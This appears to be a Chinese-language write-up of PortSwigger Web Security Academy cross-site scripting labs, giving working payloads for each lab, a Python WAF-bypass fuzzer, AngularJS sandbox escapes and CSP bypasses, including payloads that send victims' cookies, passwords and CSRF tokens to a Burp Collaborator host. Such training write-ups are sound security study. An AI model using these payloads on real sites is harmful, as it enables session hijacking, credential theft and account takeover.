# Cross-site scripting

## [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

### 題目解釋
在搜尋功能的反射性 XSS

### 解答
在搜尋上面打

```
<script>alert(1)</script>
```

## [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 
### 題目解釋
儲存型 XSS 在留言區

### 解答
在留言的 Comment 上面打

```
<script>alert(1)</script>
```

## [Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋

### 解答
觀察原始碼可以發現

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

這邊有一個 tracking，會塞到 img src 裡面，所以我可以先用 `">` 把它閉合再 XSS

在搜尋輸入
```
"> <script>alert(1)</script>
```


## [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋
題目說是 DOM-based 在 innderHTML 裡面

### 解答
搜尋列寫
```html
<img src='' onerror="alert(1)">
```


## [Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 
### 題目解釋
Href 除了跳轉路徑之外，也可以塞 `javascript:alert(1)`
### 解答
先隨便點到一篇文底下，例如

```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/post?postId=1
```

觀察 `Submit feedback` 的連結會變成 `https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=/post`

```javascript=
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

我們知道在 href 裡面塞 `javascript:alert(1)` 可以 alert

所以
```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

然後按下 Back 就可以噴出餅乾了


## [Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 

### 題目解釋
在 jQuery 裡面塞 XSS，他不用管句法的完整性，只要有 html 就會執行了

### 解答

看起來可疑的程式碼在這邊
```
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
```

直接觀察，使用者可控的地方是 `window.location.hash`，也就是網址最後面的 `#`，例如使用
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#Procrastination
```

可以直接跳到 `Procrastination` 的區塊，而其中，用上面的例子
```
window.location.hash.slice(1)
```

會回傳

```
"Procrastination"
```

而在前面有一個 `decodeURIComponent` 會做 URLDecode 的部分，整段他會做一個字串加法，再放到 `$()` 中

字串加法在這邊
```
'section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'
```

經過了一些測試， JQuery 可以直接 parse HTML，而且不會特別去管語法的完整性，也就是說右括號不呱也沒關係，例如這樣就可以 XSS

```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

繼續測試發現，甚至這樣也可以
```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

所以那就用最簡單的方法，網址打
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert(1)%3E
```

但需要注意的是他的觸發條件是 `hashchange`，所以我們需要建立一個 iframe 來控制 change 的 src 讓他途中會變動

```html
<script>
    function meow(){
        console.log(document.getElementsByTagName("iframe")[0].src);
      setTimeout(() => {
        document.getElementsByTagName("iframe")[0].src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src%3D1%20onerror%3Dprint%28%29%3E";
        console.log(document.getElementsByTagName("iframe")[0].src);
          }, 
      1000);
    }
</script>

<iframe src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#meow" onload="meow()">
</iframe>
```

## [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 
### 題目解釋
不能用 HTML 的角括號，試試看汙染 HTML 的 attribute，用一些事件來構成 XSS

### 解答
發現 如果丟最基本的 XSS
```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

會被 HTML Entity 給 Encode

```
<input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;alert(1)&lt;/script&gt;">
```



如果輸入 `123"` 的話，會變成

```
<input type=text placeholder='Search the blog...' name=search value="123"">
```

代表可以用 `"` 關閉 value 的雙引號

使用 `onmouseover` 這個事件，就過了

```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=123%22%20onmouseover=%22alert(1)
```

但我覺得沒有很清楚就是他不是打開就會跳 QQ


## [Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
### 題目解釋
href 可以塞 `javascript:alert(1)`

### 解答
觀察留言的地方，送網址會讓使用者出現超連結
```
postId=7&comment=meow&name=aaa&email=meow%40meow.meow&website=http%3A%2F%2Fmeow.com
```

而題目有說如果雙引號會被 URL Encode，而題目又說觸發只需要點下去就好，所以我們不需要跳脫 href，可以直接用
```
javascript:alert(1)
```
就過關ㄌ

## [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
 
### 題目解釋
不正常的字串串接，直接串到 js 上面，讓 js 爛掉

### 解答

送最簡單的 payload 觀察，發現會把 `<>` 做 Encode，但下面的程式碼明顯就是有洞
```javascript
var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

經過了一些測試發現 `searchTerms` 會直接超級暴力的解字串，無視 js

假設輸入 `'` 則 他會變成 `var searchTerms = '''`

所以就可以構造以下 Payload

```
'+alert(1);//
```

## [Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 

### 題目解釋
觀察原始碼會吃的參數

### 解答
原始碼

```javascript=
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

發現他會吃 storeId 參數，然後進去裡面

```
https://ac721f361f19caf4c02c4c270073000e.web-security-academy.net/product?productId=1&storeId=123</option><script>alert(1)</script>
```

## [Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 
### 題目解釋
AngularJS

### 解答

直接送最普通的會發現被 Encode 了
```
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
```

Google 找到 Angular 的 XSS 方法在  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) 上

```
{{constructor.constructor('alert(1)')()}}
```

## [Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
### 題目敘述
 This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function. 
### 題目解釋
eval 搭配 Escape 雙引號，但沒有 Escape 反斜線

### 解答

觀察原始碼

```
 <script>search('search-results')</script>
```

```javascript=
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}

```

直覺 `eval('var searchResultsObj = ' + this.responseText);` 很可疑

直接對他下斷點搜尋 `meow` 觀察結果

他的 `this.responseText` 值會是 
```
{"results":[],"searchTerm":"meow"}
```

所以我的 Payload 如果輸入
```
meow"} + alert(1); //
```

他的完整會變成
```
{"results":[],"searchTerm":"meow\"} + alert(1); //"}
```

發現 `meow` 後面的 `"` 被 Escape 了

最終 Payload

```
meow\"} + alert(1); //
```

## [Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
### 題目敘述
 This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 
### 題目解釋
JS Replace 小特性，只會 Replace 第一個

### 解答

觀察原始碼，重點應該在這邊
```javascript=
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

有一個 JS 的小特性，他的 Replace 只會套用第一個參數
```
"<><>".replace("<",1).replace(">",2) 會回傳 `12<>`
```

所以 Payload

```
<> <img src=1 onerror=alert(1)>
```

## [Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
### 題目敘述
 This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 
### 題目解釋
XSS 偷餅乾

### 解答

```
<img src="1" onerror="console.log(1)">
```
可以順利 XSS

```
<img src=1 onerror="new Image().src='http://moe22y1n6clplh2d0x7lk0n77ydo1d.burpcollaborator.net/'+document.cookie">
```

然後就收到了

```
GET /secret=KCTBgYavdncSXqcoqyz4NuDQQU4vkvSk;%20session=xE877pqOmN764sEi7mQ1qJ6cwoF7Z2Ck HTTP/1.1
```

手動用 F12 把 session 加進去餅乾就過關了

## [Lab: Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
### 題目敘述
 This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
### 題目解釋
Local 用 XSS 釣魚
### 解答
我覺得這題題目沒有講清楚，主要是被害者看到框框就會填帳密，所以做一個假的登入騙他打字
```
<input name="username">
<input name="password" type="password" onchange="new Image().src='http://alzsr5jhuaor5hw6e594b7qaq1wrkg.burpcollaborator.net/'+(document.getElementsByName('username')[0].value + ':' + document.getElementsByName('password')[0].value)">
```

就會收到

```
GET /administrator:xqrn0yctmig5fqpgsqcy HTTP/1.1
```

然後用這組帳密登入即可



## [Lab: Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
### 題目敘述
 This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
CSRF 先偷 Token 再送資料

### 解答

我自己需要變更時，需要 Post 到
```
POST /my-account/change-email

email=aaa%40ccc.ddd&csrf=fEKGXh3N8B3D9XmgCwLwq9tqbNnH7nTT
```

所以基本上我們只需要

```
<form id="myForm" name="myForm" action="/my-account/change-email" method="POST">
<input type=hidden name="email" id="email" value="meow@meow.meow"/>
<input type=hidden name="csrf" id="csrf" value="fEKGXh3N8B3D9XmgCwLwq9tqbNnH7nTT"/>
<input type=hidden name="submit" id="submit" value="submit"/>
<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
```

這樣就能自動送了，不過還有一個問題是我們要想辦法取得被害者的 CSRF Token

最終 Payload
```html
<script>
function post_data(csrf_token){
    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/my-account/change-email', true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("email=meow1%40meow.meow&csrf="+csrf_token);
}

function get_csrf() {
    var re = /[A-Za-z0-9]{32}/g;
    csrf_token = this.responseText.match(re)[0];
    post_data(csrf_token);
}

var get_csrf_request = new XMLHttpRequest();
get_csrf_request.addEventListener("load", get_csrf);
get_csrf_request.open("GET", "https://acd81f291fcc2d2ac06f2bb30025003d.web-security-academy.net/my-account");
get_csrf_request.send();
</script>

```
## [Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
### 題目敘述
 This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. 
### 題目解釋
暴力猜 WAF 沒有檔到的東西
### 解答
送
```
<script>
<img>
<html>
```
會說 `Tag is not allow`

測了一下發現 `<body>` 可以，但 `onxxx` 的 attribute 又會噴 `Attribute is not allowed`，所以可以直接暴力測

從 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 複製所有 `events`

```python
import requests

all_events = """onactivate
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onbeforeactivate
onbeforecopy
onbeforecut
onbeforedeactivate
onbeforepaste
onbeforeprint
onbeforescriptexecute
onbeforeunload
onblur
onclick
oncontextmenu
oncopy
oncut
ondblclick
ondeactivate
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
onerror
onfocus
onfocusin
onfocusout
onhashchange
onkeydown
onkeypress
onkeyup
onload
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpagehide
onpageshow
onpaste
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onresize
onscroll
onselectionchange
onselectstart
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
""".split("\n")

for att in all_events:
    res = requests.get(f"https://ac8b1fa91f9f0ce0c0611eb500ad00c5.web-security-academy.net/?search=<body {att}>")
    print(att,res.status_code)
    if res.status_code != 400:
        break
```
發現 `onresize` 可以用

然後就寫一下 Exploit 就好ㄌ
```html
<iframe src="https://ac8b1fa91f9f0ce0c0611eb500ad00c5.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" width="200" height="200">
</iframe>

<script>
    setTimeout(()=>{
        document.getElementsByTagName("iframe")[0].width=300;
    },3000);
</script>
```

## [Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
### 題目敘述
 This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie. 
### 題目解釋
Custom tag XSS

### 解答

Chrome Only
```
<form id="myForm" name="myForm" action="https://acbe1f0f1e18558ac0ee66a900380039.web-security-academy.net/#x" method="GET">
<input type=hidden name="search" id="search" value="<xss id=x onfocus=alert(document.cookie) tabindex=1>"/>
<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
```

## [Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

### 題目敘述
 This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert() function. 

### 題目解釋
svg XSS

### 解答
先測試確定可以用 `<svg>`

而 svg 有 4 個子 tag, `animate`, `animatemotion`,`animatetransform`, `set`

測了一下
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
就可以跳 alert 了，但依然無法解，不知道為什麼 QQ


用官方解也能跳，但不能解，感覺是題目壞掉了 (2022/2/19)
```
"><svg><animatetransform onbegin=alert(1)>
```

## [Lab: Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
### 題目敘述
 This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X

Please note that the intended solution to this lab is only possible in Chrome. 

### 題目解釋
不知道 QQ

### 解答
不知道在幹嘛，這樣就解掉ㄌ，怪
```
https://ac501f4c1e11ddbac0d923cd00260062.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

## [Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

### 題目解釋
直接把 parameter 塞進 JS 中

### 解答
發現輸入
```
GET /?search=123"<script>alert(1)</script>
```

他會爛掉，直接用我的 `</script>` 閉合掉 script ㄌ

```
<script>
var searchTerms = '123"<script>alert(1)</script>
```

所以我

```
GET /?search=123"<script>alert(1)</script><script>alert(1)</script> HTTP/1.1
```

就解了


## [Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
### 題目解釋
沒有 Encode `\`

### 解答

先用最普通的 Payload 觀察

```
var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

輸入後的東西會先被 HTML Entity Encode，然後再被 `encodeURIComponent(searchTerms)` URL Encode

發現單引號 `'` 會被 Escape 成 `\'`，但是 `\` 可以直接吃進去

所以 Payload

```
123\'+alert(1); //
```


## [Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
### 題目解釋
- **HTML 的 event 裡面不認 string 的 escape \\**
- **如果需要 escape 的話需要用 HTML Entity**

### 解答

看起來重點出在放網址後，後面的 Tracker

```
http://aaa"123
```

後面會變成

```
<a id="author" href="http://aaa&quot;123" onclick="var tracker={track(){}};tracker.track('http://aaa&quot;123');">
```

發現單引號會被 Escape

不過需要注意

```
"var tracker={track(){}};tracker.track('http://aaa?\'');"
```

這種狀況的 `\'` 會被外面的 `"` 吃掉，所以裡面的字串是

```
"var tracker={track(){}};tracker.track('http://aaa?'');"
```

有一個超級重要的特性！

- **HTML 的 event 裡面不認 string 的 escape \\**
- **如果需要 escape 的話需要用 HTML Entity**

也就是說，我們希望構成 (`'` 是 `&apos;`)

```
onclick="var tracker={track(){}};tracker.track('http://aaa&apos;+alert(1)+&apos;');"
```

所以送入
```
http://aaa&apos;+alert(1)+&apos;
```

也就是

```
http%3A%2F%2Faaa%26apos%3B%2Balert%281%29%2B%26apos%3B
```

## [Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string. 
 
### 題目解釋
Template literals，類似 Py 的 f-string
### 解答

一樣從最基本的開始
```
var message = `0 search results for '\u003cscript\u003ealert(1)\u003c/script\u003e'`;
document.getElementById('searchMessage').innerText = message;
```

發現他是用 
```
``
```
所以可以用

```
`${alert(1)}`
```

類似 Python 的 f-string 方法來解


## [Lab: Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
### 題目敘述
 This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
`<a href="">Click me</a>`

### 題目解釋
SVG Attribute Click XSS

### 解答

首先發現 `svg` Tag 跟 `<a>` 都可以使用
```html
<svg><animate attributeName=x dur=1s repeatCount=2 />
```

接下來可以讓 svg 裡面出現一些文字
```
<svg><a><animate attributeName=x dur=1s repeatCount=2 /><text x=20 y=20>Click Me</text></a>
```

手動寫 Attribute Name 跟 hrefs

```
<svg><a><animate attributeName=href values="javascript:alert(1)" dur=1s repeatCount=2 /><text x=20 y=20>Click Me</text></a>
```

---

以下題目有點無聊 QQ，還沒有認真研究

## [Lab: Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
### 題目敘述
 This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 

### 題目解釋
N/A

### 解答
可以看出攻擊點是

如果輸入 `https://acbb1f201ee33a64c059d28b009e00c9.web-security-academy.net/post?postId=5&123`

```
 <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26123'}).finally(_ => window.location = '/')">Back to Blog</a>
```

最終 Payload:

```
https://acbb1f201ee33a64c059d28b009e00c9.web-security-academy.net/post?postId=5&'},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
```
## [Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings)

### 題目敘述
 This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function. 
### 題目解釋

### 解答

攻擊點
```javascript=
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
$scope.query = {};
var key = 'search';
$scope.query[key] = '123';
$scope.value = $parse(key)($scope.query);
});
```


Payload

```
https://ac051fd81e10a67bc0a5302500f30066.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
## [Lab: Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp)
### 題目敘述
 This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 
### 題目解釋
### 解答

Payload

```
<script>
location='https://acdb1f551ee495ccc01203c100ba0092.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

## [Lab: Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
### 題目敘述
 This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and exfiltrates the CSRF token using Burp Collaborator. You need to label your vector with the word "Click" in order to induce the simulated victim user to click it. For example:
`<a href="">Click me</a>`

### 題目解釋

### 解答


可以撿到 CSRF Token

```
<script>
if(window.name) {
        var re = /[A-Za-z0-9]{32}/;
        var csrf_token = window.name.match(re)[0];
	new Image().src='http://' +csrf_token + '.im8ye4hqxv6jyov53tornhnz9qfh36.burpcollaborator.net/?meow='+csrf_token;
	} else {
		location = 'https://ac2b1fc91e9da617c0d53285003500f9.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-ac431f951e74a6d7c0b9321201c000a1.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

但要注意 DNS 不分大小寫 QQ

Token : `Bl37LgBHPNCjyhmPRfrgyqZZtdQMX4oj`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac2b1fc91e9da617c0d53285003500f9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;nets" />
      <input type="hidden" name="csrf" value="Bl37LgBHPNCjyhmPRfrgyqZZtdQMX4oj" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


## [Lab: Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
### 題目敘述
 This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

Please note that the intended solution to this lab is only possible in Chrome.
### 題目解釋
### 解答

```
